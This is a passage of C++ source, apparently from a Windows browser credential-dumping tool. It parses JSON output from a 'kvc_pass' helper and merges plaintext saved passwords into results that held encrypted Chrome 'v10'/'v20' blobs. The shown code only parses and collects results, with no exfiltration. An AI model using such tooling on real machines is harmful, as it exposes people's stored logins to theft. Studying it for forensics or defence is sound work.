                        else if (c == '\\') val += '\\';
                        else if (c == 'n') val += '\n';
                        else val += c;
                        p += 2;
                    } else if (json[p] == '"') { ++p; break; }
                    else val += json[p++];
                }
                return {val, p};
            };

            auto [origin,   p1] = readField("origin",   pos);
            auto [username, p2] = readField("username", pos);
            auto [password, p3] = readField("password", pos);

            pos = json.find('}', pos);
            if (pos != std::string::npos) ++pos;

            if (origin.empty() || password.empty())
                continue;

            std::wstring wOrigin   = StringUtils::UTF8ToWide(origin);
            std::wstring wUsername = StringUtils::UTF8ToWide(username);
            std::wstring wPassword = StringUtils::UTF8ToWide(password);

            // Try to update an existing v10/v20 placeholder entry
            bool merged = false;
            for (auto& r : results) {
                if (r.type.find(browserName) == std::wstring::npos) continue;
                if (r.url != wOrigin || r.username != wUsername) continue;

                std::string blob = StringUtils::WideToUTF8(r.password);
                bool isBlob = blob.size() > 3 &&
                              (blob.substr(0, 3) == "v10" || blob.substr(0, 3) == "v20");
                if (!isBlob) continue;

                r.password = wPassword;
                r.status   = DPAPIConstants::GetStatusDecrypted();
                merged = true;
                break;
            }

            if (!merged) {
                PasswordResult nr;
                nr.type     = browserName;
                nr.profile  = profileEntry.path().filename().wstring();
                nr.url      = wOrigin;
                nr.username = wUsername;
                nr.password = wPassword;
                nr.status   = DPAPIConstants::GetStatusDecrypted();
                results.push_back(nr);
            }
        }
    }

    INFO(L"MergeKvcPassResults: merged kvc_pass passwords for %s", browserName.c_str());
}
